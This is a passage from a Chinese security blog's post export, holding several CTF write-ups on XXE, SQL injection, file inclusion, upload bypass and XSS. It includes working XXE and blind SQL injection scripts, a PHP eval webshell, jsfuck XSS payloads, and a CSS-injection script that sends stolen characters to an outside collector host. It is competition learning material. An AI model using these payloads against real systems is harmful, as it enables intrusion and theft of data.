\"\\r\\n\" + \"\"\"&lt;!DOCTYPE foo [ &lt;!ELEMENT foo ANY &gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;!ENTITY xxe SYSTEM \"\"\" + '\"' + string + '\"' + \"\"\"&gt;]&gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;xml&gt;\"\"\" xml += \"\\r\\n\" + \"\"\" &lt;stuff&gt;&amp;xxe;&lt;/stuff&gt;\"\"\" xml += \"\\r\\n\" + \"\"\"&lt;/xml&gt;\"\"\" send_xml(xml)def send_xml(xml): headers = &#123;'Content-Type': 'application/xml'&#125; x = requests.post('http://vps_ip/ctf/xxe/xml1.php', data=xml, headers=headers, timeout=5).text coded_string = x.split(' ')[-2] print(coded_string)for i in range(1,255): try: i = str(i) ip = \"100.100.100.\" + i string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/' print(string) build_xml(string) except: continue 支持，我们就可以探测到所有主机的信息了 http内网主机端口扫描同样的道理，我们也可以遍历一次主机的所有端口，用burp跑一下就行了 文件上传利用这个利用一般会在java方面比较多，就是jar协议的利用首先我们先了解一下jar协议 jar://jar文件url语法：12jar:&#123;url&#125;!/&#123;entry&#125;url是文件的路径，entry是想要解压出来的文件 jar处理文件的过程：1、下载需要处理的文件到临时文件中2、提取出我们想要的文件3、删除临时文件可以看到，jar处理文件是会生成临时文件的，那样我们怎么去找到那个临时文件并且进行利用呢先来个本地测试java代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465import java.io.File;import javax.xml.parsers.DocumentBuilder;import javax.xml.parsers.DocumentBuilderFactory;import org.w3c.dom.Attr;import org.w3c.dom.Comment;import org.w3c.dom.Document;import org.w3c.dom.Element;import org.w3c.dom.NamedNodeMap;import org.w3c.dom.Node;import org.w3c.dom.NodeList;/** * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上 */public class xml_test&#123; public static void main(String[] args) throws Exception&#123; DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance(); DocumentBuilder db = dbf.newDocumentBuilder(); Document doc = db.parse(new File(\"src/student.xml\")); //获得根元素结点 Element root = doc.getDocumentElement(); parseElement(root); &#125; private static void parseElement(Element element)&#123; String tagName = element.getNodeName(); NodeList children = element.getChildNodes(); System.out.print(\"&lt;\" + tagName); //element元素的所有属性所构成的NamedNodeMap对象，需要对其进行判断 NamedNodeMap map = element.getAttributes(); //如果该元素存在属性 if(null != map)&#123; for(int i = 0; i &lt; map.getLength(); i++)&#123; //获得该元素的每一个属性 Attr attr = (Attr)map.item(i); String attrName = attr.getName(); String attrValue = attr.getValue(); System.out.print(\" \" + attrName + \"=\\\"\" + attrValue + \"\\\"\"); &#125; &#125; System.out.print(\"&gt;\"); for(int i = 0; i &lt; children.getLength(); i++)&#123; Node node = children.item(i); //获得结点的类型 short nodeType = node.getNodeType(); if(nodeType == Node.ELEMENT_NODE)&#123; //是元素，继续递归 parseElement((Element)node); &#125; else if(nodeType == Node.TEXT_NODE)&#123; //递归出口 System.out.print(node.getNodeValue()); &#125; else if(nodeType == Node.COMMENT_NODE)&#123; System.out.print(\"&lt;!--\"); Comment comment = (Comment)node; //注释内容 String data = comment.getData(); System.out.print(data); System.out.print(\"--&gt;\"); &#125; &#125; System.out.print(\"&lt;/\" + tagName + \"&gt;\"); &#125;&#125; student.xml的内容1234&lt;!DOCTYPE convert [&lt;!ENTITY remote SYSTEM \"jar:http://localhost:9999/jar.zip!/1.php\"&gt;]&gt;&lt;convert&gt;&amp;remote;&lt;/convert&gt; python服务器123456789101112131415161718192021222324252627282930313233343536373839404142import sysimport timeimport threadingimport socketserverfrom urllib.parse import quoteimport http.client as httpclisten_host = 'localhost'listen_port = 9999jar_file = sys.argv[1]class JarRequestHandler(socketserver.BaseRequestHandler): def handle(self): http_req = b'' print('New connection:',self.client_address) while b'\\r\\n\\r\\n' not in http_req: try: http_req += self.request.recv(4096) print('Client req:\\r\\n',http_req.decode()) jf = open(jar_file, 'rb') contents = jf.read() headers = ('''HTTP/1.0 200 OK\\r\\n''' '''Content-Type: application/java-archive\\r\\n\\r\\n''') self.request.sendall(headers.encode('ascii')) self.request.sendall(contents[:-1]) time.sleep(30) print(30) self.request.sendall(contents[-1:]) except Exception as e: print (\"get error at:\"+str(e))if __name__ == '__main__': jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) print ('waiting for connection...') server_thread = threading.Thread(target=jarserver.serve_forever) server_thread.daemon = True server_thread.start() server_thread.join() 我们先运行python服务器脚本，让其进行监听然后再运行java脚本，可以看到报了个错，因为student.xml里面的jar.zip包里是没有1.php文件的，找不到自然就会报错然后这个时候我们去找报错的文件路径，就可以看到那个临时文件了既然能有临时文件，剩下的就是想办法让临时文件留的久一点进行操作了我们可以让python的延时长一点，不仅仅是30s，同时，也可以将传上去的文件先最后加一个垃圾字符，然后在传到最后一秒的时候，停住不动，这样实际上已经传完了，但是服务器以为没传完而已，剩下的进行文件替换就行","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/29/xxe漏洞攻击与防御/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"xxe","slug":"xxe","permalink":"https://xi4or0uji.github.io/tags/xxe/"}]},{"title":"2018高校运维赛wp","date":"2018-11-17T16:00:00.000Z","path":"2018/11/18/2018高校运维赛wp/","text":"Simple BBS登录处没有过滤单引号，且没有报错信息，利用报错注入注出flag1admin'union select (extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables),0x7e)))# 尝试一下读一下flag，发现限制了长度，利用substr进行读取1admin'union select (extractvalue(1,substr((select flag from flag),20,40),0x7e)))# Simple Blog题目提示了一下是二次注入和文件包含漏洞，尝试一下正常的访问，答题以后分数是会进行计算然后正常显示的注册一个用户名为lll’的用户进行答题，发现分数会一直都是0，所以二次注入的点应该是在这里利用exp进行报错盲注1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# -*- coding:utf8 -*-import requestsregister_url =\"http://210.32.4.20/register.php\"login_url = \"http://210.32.4.20/login.php\"answer_url = \"http://210.32.4.20/answer.php\"logout_url = \"http://210.32.4.20/logout.php\"header = &#123; \"Cookie\": \"PHPSESSID=ort60sffvfo8sfjfc9h5htk16p\"&#125;res = \"alert('Your grades is 0');\"flag = \"\"def test(): response = requests.post(answer_url,data=&#123; \"1.a\": \"on\" &#125;,headers=header).content if res in response: return resdef register(message): requests.post(register_url,data=&#123; \"username\": message, \"password\": 123 &#125;,headers=header)def login(message): requests.post(login_url,data=&#123; \"username\": message, \"password\": 123 &#125;,headers=header)def logout(): requests.post(logout_url,headers=header)for i in range(1,50): print(\"trying: \" + str(i)) for j in range(32,128): payload = \"1' and if((ascii(substr((select flag from flag),%s,1))=%s),exp(~(select * from(select user())a)),1)#\"%(i,j) register(payload) login(payload) if test(): flag += chr(j) print(flag) logout() break logout()print(\"flag is \" + flag) SimpleServerInjection提示是ssi漏洞，博客做题23333https://www.secpulse.com/archives/66934.html然后1&lt;!--#include virtual=\"flag\"--&gt; 就有flag了 SimpleExtensionExplorerInjection这题给了源码的包，审计源码可以看到UserController.php里面有个UserPayload可以看到函数里面有个@XBRead函数，可以解析XML同时回显，XXE打过去1234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///flag\" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 然后就能有flag了 SimplePrintEventLogger这题跟上一题差不多，感觉只是多了个框架，但是发送的请求还是可以进行xml解析，只不过这次不知道flag文件叫什么，继续XXE打过去1234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///\" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; 发现回显的目录里面有个flagvvvvvaaaagegsgag2333文件，继续读就有flag了1234&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY&gt;&lt;!ENTITY xxe SYSTEM \"file:///flagvvvvvaaaagegsgag2333\" &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt; SimpleWasmReverse这题逆向肉鸡真的不会，溜溜球了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/18/2018高校运维赛wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"suctf招新赛wp","date":"2018-11-14T16:00:00.000Z","path":"2018/11/15/suctf招新赛wp/","text":"招新赛这段时间刚好撞上一堆其他比赛，肉鸡肝不动了，趁着这几天平台还没关赶紧做一下。 where are you from level1这题点进去看见hello from + 本机ip地址，而且提示only guest from 127.0.0.1 can get flag of level1，抓包将client-ip改成127.0.0.1就有flag了 include me这题点进去可以看到一个改变语言的选择框，选下其他的发现除了语言有变化，网站连接的后面lang的值也会改变，可以想到这是一个文件包含的点尝试一下进行伪协议利用，?lang=php://filter/read/convert.base64-encode/resource=index.php，发现确实可以进行文件读取，解密就有flag了 yunpan这个网站点进去可以看到一堆的文件，点开后面几个视频将它们下下来，看了一下，都是葫芦娃，没看出什么，点开readme.txt也只是一堆的嘤嘤嘤…….仔细看看，发现有个302解密一下这堆base64，发现正好是readme.txt，将flag.php解密一下发过去，发现有个flag.php下下来，打开就有flag了 onepiece这题点开看见网页显示用了phpstorm，想一下平时我们用phpstorm的时候总是会有一个.idea文件，尝试一下在链接后面加.idea，发现一堆文件将他们下下来发现里面有UpL0ad.php、README.html、index.php访问UpL0ad.php是一个文件上传的地方访问一下readme.html看见于是在链接后面加个onepiece.zip，发现有文件下下来，里面有个jiami.php，打开看见一堆混淆代码，找个网站解密一下 https://tool.lu/php ，可以看见很明显的变量覆盖，在upload.php页面上抓包将file的变量改成flag就拿到flag了 easy_upload这题很明显的文件上传漏洞，尝试一下上传php文件，嗯，确实触发waf了，只允许传png文件，改下content-type成image/png，然后再把后缀改成phtml就可以上传文件了，但是却回显不能包含&lt;?php，这里用javascript去绕过12345&lt;head&gt;&lt;script language=\"php\"&gt;eval($_POST[\"cmd\"]);&lt;/script&gt; &lt;/head&gt; 发现成功上传文件，菜刀连过去打开flag.php就有flag了 baby_upload这题也是文件上传的题目，点进去尝试一下传个php文件，也是只能传图片，想传个php文件然后改变绕过，结果发现开着代理刚选完文件就弹只能选图片，看来前端有个js检测文件的，看下源码确实是有想禁用了火狐的js然后再改包，可是不知道为什么禁用了还是发不了包，只能先发一个图片的包然后改，最后改了content-type和后缀成phps再加一句shell语句就能成功get flag了 php is No.1点进去看见一堆源码123456789101112131415161718192021222324252627282930 &lt;?phpinclude 'flag.php';isset($_GET['time'])?$time = $_GET['time']:$time = 0;isset($_GET['num'])?$num = $_GET['num']:$num = 0;$c=is_numeric($time) and is_numeric($num);if ($num == 0) &#123; if($num)&#123; if($c)&#123; if(!is_numeric($time)) echo 'Time time must be number'; else if ($time &lt; 60 * 60 * 24 * 30 * 1) echo 'This time is too short'; else if ($time &gt; 60 * 60 * 24 * 30 * 2) echo 'This time is too long'; else&#123; sleep((int)$time); echo $flag; &#125; &#125; else echo 'Try again'; &#125; else echo 'Try again';&#125;else echo 'Try again';echo '&lt;hr&gt;';highlight_file(__FILE__);?&gt; 简单来说，就是要传两个值，一个num一个time，然后num要是数字且等于0，然后time的值必须在2592000和5184000之间，如果符合让浏览器sleep time的时间，然后再输出flag，显然直接让浏览器睡这么长是不现实的，所以我们要用科学计数法绕过，至于num，就用%00截断，或者输个字符也行 where are you from level2这里我们要先看level1出来的源码123456789101112131415161718 &lt;?phpfunction getIp()&#123; if(!empty($_SERVER['HTTP_CLIENT_IP']))&#123; $cip=$_SERVER['HTTP_CLIENT_IP']; &#125; elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; $cip=$_SERVER['HTTP_X_FORWARDED_FOR']; &#125; elseif(!empty($_SERVER['REMOTE_ADDR']))&#123; $cip=$_SERVER['REMOTE_ADDR']; &#125; else&#123; $cip=''; &#125; $cip=preg_replace('/\\s|select|from|limit|union|join/iU','',$cip); return $cip;&#125; $query=$mysqli-&gt;query(\"insert into ip_records(ip,time) values ('$ip','$time')\"); 可以看到，select等关键字被过滤了，但是可以用重写去绕过，剩下的就是注入了Client-Ip: 12’,(selselectect//database()))#Client-Ip: 12’,(selselectect//group_concat(table_name)//ffromrom//information_schema.tables//where//table_schema=database()))#Client-Ip: 12’,(selselectect//group_concat(column_name)//ffromrom//information_schema.columns//where//table_name=’flaaag’))#Client-Ip: 12’,(selselectect//fl4g//ffromrom//flaaag))#好了，flag就出来了 classic sqli源码12345678910111213141516171819&lt;?php include \"./config.php\";include \"./flag.php\";error_reporting(0);$black_list = \"/guest|limit|substr|mid|like|or|char|union|select|greatest|\\'|\";$black_list .= \"=|_| |in|&lt;|&gt;|-|\\.|\\(|\\)|#|and|if|database|where|concat|insert|having|sleep/i\";if(preg_match($black_list, $_GET['user'])) exit(\"Hacker detected!\"); if(preg_match($black_list, $_GET['pw'])) exit(\"Hacker detected!\"); $query=\"select user from chal where user='$_GET[user]' and pw='$_GET[pw]'\"; $result = mysqli_query($link, $query);$result = mysqli_fetch_array($result);$admin_pass = mysqli_fetch_array(mysqli_query($link, \"select pw from chal where user='admin'\"));echo \"&lt;h1&gt;query : &lt;strong&gt;&lt;b&gt;&#123;$query&#125;&lt;/b&gt;&lt;/strong&gt;&lt;br&gt;&lt;/h1&gt;\";if($result['user']) echo \"&lt;h2&gt;Bonjour!, &#123;$result['user']&#125;&lt;/h2&gt;\"; if(($admin_pass['pw'])&amp;&amp;($admin_pass['pw'] === $_GET['pw']))&#123; echo $flag; &#125;highlight_file(__FILE__); ?&gt; 这题是正则表达式盲注，过滤了很多东西，普通的盲注基本是不可能的了，只能进行正则盲注获得管理员的密码。利用regexp去匹配正则表达式，用/**/代替空格，最后用%00进行截断payload:1?user=\\&amp;pw=^0%26%26user/**/regexp/**/0x61646d696e%26%26pw/**/regexp/**/%22^&#123;&#125;%22;%00 肉鸡技术太差，脚本报了个错，最后只能用burp去进行注入了（逃这里就不贴脚本了，最后爆出密码是1adpmh105i31，登录就完事了 xss1源码1234567891011&lt;script&gt;function check(input) &#123; while (input.indexOf('alert') &gt;= 0) &#123; input = input.replace(/(alert)+/g, ''); &#125; input = 'console.log(\"' + input + '\");'; var script = document.createElement('script'); script.innerText = input; document.body.appendChild(script);&#125;&lt;/script&gt; 这道题题目提示说alert(1)就行，但是可以看见，无论有多少个alert，js代码都会将它去掉，因此我们只能用其他的办法进行绕过，这里用jsfuck编码构造payload，只要闭合了前面的console.log，再注释掉后面的符号就可以弹1了1\");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])();// 好了，flag get√ gallery未完待续，先让肉鸡搞懂先 xss2源码1234567&lt;script&gt;function check(input) &#123; input = input.replace(/[^\\[\\]\\!\\+]+/g, ''); console.log('Filtered input: ' + input); eval(eval(input) + '(1)');&#125;&lt;/script&gt; 可以看到，正则表达式只允许[]和!，因此我们还是回到jsfuck编码的利用12345a: [![]+[]][+[]][+!![]]l: [![]+[]][+[]][!+[]+!+[]]e: [![]+[]][+[]][!+[]+!+[]+!+[]+!+[]]r: [!![]+[]][+[]][+!+[]]t: [!![]+[]][+[]][+[]] 将他们加起来就是payload了1[![]+[]][+[]][+!![]]+[![]+[]][+[]][!+[]+!+[]]+[![]+[]][+[]][!+[]+!+[]+!+[]+!+[]]+[!![]+[]][+[]][+!+[]]+[!![]+[]][+[]][+[]] 403readfile这题进去看到一个非常非常真的403页面，但是看下状态码是200，嗯，搞事情啊然后扫下后台看见有个robots.txt，访问看一下有两个disallow，一个是flag.php，一个是get.php估计也是文件包含什么的了，果然点开get.php看见里面有个链接，点了以后有个file，没错了，就是这里了，最初的链接是./1.txt，发现去掉./直接访问1.txt也可以找到文件，大胆猜测是不是过滤了./，果然，尝试一下访问in./dex.php也是可以正常回显的，确定是过滤./了，访问一下fl./ag.php发现文件找不到，emmm，尝试一下上一个目录，?file=…//fla./g.php，然后就发现拿到flag了 secure html这题后台的思路是secure_html.php先给你一个输入框，然后你在里面写东西，然后就根据你的session去创建一个对应的html文件，放在pages目录下，然后再将新建的html文件的内容插入secure_html.php的开头因为自己创建的html的内容的可控的，所以我们只需要在里面插入php代码，然后执行就可以实现任意命令执行了，但是尝试一下发现secure_html.php对php过滤的很严格，就算是转成script去写也是会被过滤掉…emmm…看来此路不通=_=这里插一个知识点，在nginx开启了webdav模块的时候是支持用http方法中的PUT方法更新文件的，所以我们可以尝试一下将php语句写进去已经创建了的html文件这里的flag文件是在根目录这样我们就将php语句写进去html文件了，再次访问secure_html.php文件也就可以拿到flag了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/15/suctf招新赛wp/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xi4or0uji.github.io/tags/CTF/"}]},{"title":"你拿不到我的源码","date":"2018-11-13T16:00:00.000Z","path":"2018/11/14/你拿不到我的源码/","text":"传送门：http://laohulaohuhu.cn:32771/guest登录进去就看到一个很明显的文件包含点，filter读一下index.php那些文件出来解密居然是乱码的……..我佛辣…….然后尝试一下读多几个文件出来，发现开头都是&lt;@rkt，很像&lt;?php，看一下字符的ascii码，发现第n个位置的字符的ascii码减去n-1就可以正常解密了，但是要注意一下不能超过128，给个脚本123456789import base64strs = \"待解密字符\"res = base64.b64decode(strs)str2 = \"\"i = 0for c in res: str2 += chr(((ord(c) - i)%128 + 128) %128) i += 1print(str2) 解密出来可以看到是如下文件，这里只放php的部分12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758index.php&lt;?php session_start(); define(\"enter\", 1); ini_set(\"error_reporting\", 0); if (preg_match(\"/sess_|php(\\w)+/i\", $_GET['page'])) &#123; $_GET['page'] = \"login.php\"; &#125; $page = isset($_GET['page'])? $_GET['page'] : \"login.php\"; include $page;home.php&lt;?php if (enter !== 1) &#123; header(\"location:index.php?page=home.php\"); &#125;else if (!isset($_SESSION['user'])) &#123; header(\"location:index.php?page=login.php\"); &#125;?&gt;&lt;?php if ($_SESSION['user'] === 'Admin') &#123; echo \"&lt;li class=\\\"nav-item active\\\"&gt;&lt;form id=\\\"submit_key\\\" action=\\\"index.php?page=home.php\\\" method=\\\"post\\\" class=\\\"nav-link\\\"&gt;&lt;input type=\\\"number\\\" name=\\\"key\\\" class=\\\"form-control\\\" placeholder=\\\"Submit Admin Key\\\" required autofocus&gt;&lt;/form&gt;&lt;/li&gt;&lt;li class=\\\"form-inline my-2 my-md-0\\\"&gt;&lt;button class=\\\"btn btn-lg btn-primary btn-block\\\" type=\\\"button\\\" onclick=\\\"document.getElementById('submit_key').submit();\\\"&gt;Submit key&lt;/button&gt;&lt;/li&gt;\"; &#125;?&gt;&lt;?php if ($_SESSION['user'] === 'Admin' &amp;&amp; isset($_POST['key'])) &#123; if (GWHT_CheckCrypto($_POST['key'])) &#123; echo \"&lt;span style='color: green'&gt;Hey Admin! Your flag is: GWHT&#123;\" . $_SESSION['flag1'] . $_POST['key'] . \"&#125;&lt;/span&gt;\"; &#125;else &#123; echo \"&lt;span style='color: red'&gt;No! You are a fake Admin! I will not give my flag to me&lt;/span&gt;\"; &#125; &#125;else if ($_SESSION['user'] === 'Guest') &#123; echo \"&lt;span style='color: red'&gt;My flag is for Admin, not for Guest!&lt;/span&gt;\"; &#125;?&gt;login.php&lt;?php if (enter !== 1) &#123; header(\"location:index.php?page=login.php\"); &#125;else &#123; $info = \"Please login in\"; if (isset($_POST['user']) &amp;&amp; isset($_POST['pwd'])) &#123; if ($_POST['user'] === 'Guest' &amp;&amp; $_POST['pwd'] === 'Guest') &#123; $_SESSION['user'] = 'Guest'; header(\"location:index.php?page=home.php\"); &#125;else &#123; if (twings($_POST['user'], $_POST['pwd'])) &#123; $_SESSION['user'] = 'Admin'; $_SESSION['flag1'] = $_POST['pwd']; header(\"location:index.php?page=home.php\"); &#125; $info = \"&lt;span style='color: red'&gt;Login failed&lt;/span&gt;\"; &#125; &#125; &#125;?&gt; 可以看到关键的几句可以看见flag是由flag1的session和传过来的key决定的，而flag1的session是由传过去的pwd决定的，但是没看到有什么继续包含的文件了，剩下的应该就是扩展的事了读一下phpinfo，可以看到扩展的目录和扩展名，写个脚本把扩展文件下下来123456789#!python#!/usr/bin/pythonimport urllib2import base64u = urllib2.urlopen('http://laohulaohuhu.cn:32771/index.php?page=php://filter/read/convert.base64-encode/resource=/usr/lib/php/20151012/twings.so')localfile = open('twings.so','wb')u = base64.b64decode(u.read())localfile.write(u)localfile.close() 将下下来的扩展文件用ida打开，可以看到三个函数，emmm，与题目有关系的也是这三个函数zif_twings前面一堆没看懂，但是后面的一堆check有点意思，可以看到那个if语句比对了user的值，然后再去比对pwd的值，大胆猜测，Admin_CheckBy-Twings就是管理员的用户名，后面的pwd比对将它改成赋值就可以获得pwd的值了接下来是GWHT那个文件，关键点在encrypt函数，跟过去看一看可以看到，这个函数是个布尔函数，只需要传一个值，然后进行比对，最后当v1和v3符合条件的时候返回true函数分析完了，最后是re的脚本123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;bits/stdc++.h&gt;using namespace std;int main()&#123; int check[20]; check[0] = 9; check[1] = 10; check[2] = 116; check[3] = 25; check[4] = 46; check[5] = 0; check[6] = 4; check[7] = 126; check[8] = 180; check[9] = 55; check[10] = 104; check[11] = 20; check[12] = 24; check[13] = 128; check[14] = 196; check[15] = 90; check[16] = 92; check[17] = 228; check[18] = 47; check[19] = 78; char user[40] = \"Admin_CheckBy-Twings\"; char pwd[40]; printf(\"user: %s\\n\",user); int i = 9; int v9 = 0; for(int j=0; j&lt;20; j++)&#123; int val = (user[v9] ^ (i &gt;&gt; (v9 - 3 * (((unsigned __int64)(1431655766LL * (signed int)v9) &gt;&gt; 32) - ((signed int)v9 &gt;&gt; 31)))));// printf(\"%d\\n\",val); pwd[j] = char(val); v9++; i=check[v9]; &#125; printf(\"pwd: %s\\n\",pwd); unsigned long long v1,v3; long long v2; v1 = -4498904630171527645LL; v3 = -5341655318926559416LL; v2 = 38300879488LL; while(v2!=0 &amp;&amp; v3!=71877284LL)&#123; v3 -= (v2 + v1) ^ (16 * v1 + 72) ^ ((v1 &gt;&gt; 5) + 84); v1 -= (v2 + v3) ^ (16 * v3 + 71) ^ ((v3 &gt;&gt; 5) + 87); v2 -= 1196902484LL; &#125; printf(\"v1: %I64u\\n\",v1); printf(\"v2: %I64d\\n\",v2); printf(\"v3: %I64u\\n\",v3); return 0; &#125; 脚本跑出来的结果最后flag","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/14/你拿不到我的源码/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"web+re","slug":"web-re","permalink":"https://xi4or0uji.github.io/tags/web-re/"}]},{"title":"很简单的xss","date":"2018-11-13T16:00:00.000Z","path":"2018/11/14/很简单的xss/","text":"继续是校赛题，这题我们进去看到一个留言框，然后题目提示写下建议，管理员会去看的，结合题目，确定是反射型xss了，尝试一下插入一下js语句进留言板，发现没反应，看下源码发现尖括号被转义了………emmm………看来想直接简单粗暴的利用是不行的了，继续回去上一页看一下，看见有个选择框，可以选择字体的样式，抓下包改下值成1212，发现在下一个页面的style属性里面有1212………..嗯，这波操作有丶东西，style属性里面的语句可控，就可以搞事情了，因为现在的浏览器版本比较高，尝试了一下直接利用js伪代码发现不行，只能一个个匹配然后弹回去自己的平台最后脚本1234567891011121314import requestsstrs = \"0123456789_qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM\"url = \"http://laohulaohuhu.cn:32772/\"flag = \"\"flag0 = \"\"for ch in strs: flag = flag0 + ch print(\"trying \"+ flag) key = &#123;'feedback':'111','style':'#secret[value^=\"' + flag + '\"]&#123;background: url(\\'http://abcdef.ceye.io/?xss=' + flag + '\\');&#125;'&#125; r = requests.post(url=url,data=key) if r.status_code == 200: print flag flag0 = flagprint(flag0) 剩下的可以去自己的平台看一下有没有打到，flag也能出来了","comments":true,"permalink":"https://xi4or0uji.github.io/2018/11/14/很简单的xss/","categories":[{"name":"WEB","slug":"WEB","permalink":"https://xi4or0uji.github.io/categories/WEB/"}],"tags":[{"name":"xss","slug":"xss","permalink":"https://xi4or0uji.github.io/tags/xss/"}]},{"title":"HCTF2018 writeup","date":"2018-11-11T16:00:00.000Z","path":"2018/11/12/HCTF2018-writeup/","text":"warmup这题进去要求你读/ffffllllaaaagggg文件源码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?php class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [\"source\"=&gt;\"source.php\",\"hint\"=&gt;\"hint.php\"]; if (! isset($page) || !is_string($page)) &#123; echo \"you can't see it\"; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo \"you can't see it\"; return false; &#125; &#125; if (! empty($_REQUEST['file']) &amp;&amp; is_string($_REQUEST['file']) &amp;&amp; emmm::checkFile($_REQUEST['file']) ) &#123; include $_REQUEST['file']; exit; &#125; else &#123; echo \"&lt;br&gt;&lt;img src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /&gt;\"; &#125; ?&gt; 可以看到需要进行一个白名单过滤，然后再请求文件，可以利用?进行截断，然后再通过include去请求文件payload:1http://warmup.2018.hctf.io/index.php?file=hint.php?/../../../../ffffllllaaaagggg 参考：http://seaii-blog.com/index.php/2018/07/03/84.html sharerobots.txt看到的源码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* this terrible code */class FileController &lt; ApplicationController before_action :authenticate_user! before_action :authenticate_role before_action :authenticate_admin protect_from_forgery :except =&gt; [:upload , :share_people_test]# post /file/upload def upload if(params[:file][:myfile] != nil &amp;&amp; params[:file][:myfile] != \"\") file = params[:file][:myfile] name = Base64.decode64(file.original_filename) ext = name.split('.')[-1] if ext == name || ext ==nil ext=\"\" end share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+\"/public/upload\") share.write(Base64.decode64(file.read)) share.close File.rename(share.path,share.path+\".\"+ext) tmp = Sharefile.new tmp.public = 0 tmp.path = share.path tmp.name = name tmp.tempname= share.path.split('/')[-1]+\".\"+ext tmp.context = params[:file][:context] tmp.save end redirect_to root_path end# post /file/Alpha_test def Alpha_test if(params[:fid] != \"\" &amp;&amp; params[:uid] != \"\" &amp;&amp; params[:fid] != nil &amp;&amp; params[:uid] != nil) fid = params[:fid].to_i uid = params[:uid].to_i if(fid &gt; 0 &amp;&amp; uid &gt; 0) if(Sharelist.find_by(sharefile_id: fid)==nil) if(Sharelist.count(\"user_id = ?\", uid.to_s) &lt;5) share = Sharelist.new share.sharefile_id = fid share.user_id = uid share.save end end end end redirect_to(root_path) end def share_file_to_all file = Sharefile.find(params[:fid]) File.rename(file.path,Rails.root+\"/public/download/\"+file.name) file.public = true file.path = Rails.root+\"/public/download/\"+file.name file.save endend 未完待续…….. kzonewww.zip 